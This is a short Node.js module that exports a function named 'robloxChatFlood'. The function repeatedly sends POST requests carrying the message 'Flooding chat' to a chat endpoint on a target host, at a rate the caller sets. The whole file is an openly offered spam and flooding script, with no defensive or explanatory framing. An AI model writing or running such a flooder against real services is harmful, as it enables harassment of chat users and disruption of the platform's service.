const request = require('request');

function robloxChatFlood(target, rateLimit) {
    setInterval(() => {
        const options = {
            url: `https://${target}/chat`,
            method: 'POST',
            json: {
                message: 'Flooding chat'
            }
        };

        request(options, (error, response, body) => {
            if (error) {
                console.error('Error: ' + error.message);
            } else {
                console.log('Sent Roblox chat message');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = robloxChatFlood;
